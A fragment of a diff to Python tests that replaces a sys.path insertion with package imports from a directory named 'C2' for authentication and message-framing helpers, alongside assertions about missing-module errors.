++    assert "No module named 'nacl'" in result.stderr
++    assert "No module named 'transport'" not in result.stderr
+diff --git a/tests/test_protocol_auth.py b/tests/test_protocol_auth.py
+index 6435c7f..80efe06 100644
+--- a/tests/test_protocol_auth.py
++++ b/tests/test_protocol_auth.py
+@@ -3,15 +3,12 @@ modules. All framing tests use an in-memory buffer — no real sockets.
+ """
+ import socket
+ import struct
+-import sys
+ from unittest.mock import MagicMock
+ 
+ import pytest
+ 
+-sys.path.insert(0, "C2")
+-
+-from auth import check_api_key, check_client_password  # noqa: E402
+-from protocol import (  # noqa: E402
++from C2.auth import check_api_key, check_client_password
++from C2.protocol import (
+     MAX_MESSAGE_SIZE,
+     decode_message,
+     encode_message,
